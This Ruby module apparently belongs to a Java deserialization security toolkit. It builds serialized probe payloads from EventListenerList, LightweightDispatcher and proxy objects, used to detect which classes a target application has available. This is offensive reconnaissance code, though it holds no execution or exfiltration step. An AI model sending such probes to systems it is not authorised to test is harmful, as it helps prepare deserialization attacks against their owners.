
require_relative '../serialize'

module Java
  module Serialize
    module Payloads
      module Probe
        def make_probe_test(posProbe)
          posTest = JavaObject.new('Ljavax/swing/event/EventListenerList;', 'listeners' => [
                                     ['java.awt.LightweightDispatcher',
                                      JavaObject.new('Ljava/awt/LightweightDispatcher;',
                                                     {})]
                                   ])
          JavaObject.new('Ljava/util/ArrayList;', 'elements' => [posTest, posProbe])
        end
        module_function :make_probe_test

        def make_eventlistenerlist_probe(classname, posProbe, negProbe)
          posTest = JavaObject.new('Ljavax/swing/event/EventListenerList;',                                    'listeners' => [
                                     ['java.awt.LightweightDispatcher',
                                      JavaObject.new('Ljava/awt/LightweightDispatcher;',
                                                     {})]
                                   ])

          negTest = JavaObject.new('Ljavax/swing/event/EventListenerList;',                                    'listeners' => [
                                     [classname,
                                      Java::Serialize::JavaProxy.new(['java.util.EventListener'],
                                                                     nil)]
                                   ])

          JavaObject.new('Ljava/util/ArrayList;', 'elements' => [posTest, posProbe, negTest, negProbe])
        end

        module_function :make_eventlistenerlist_probe
        end
    end
  end
end
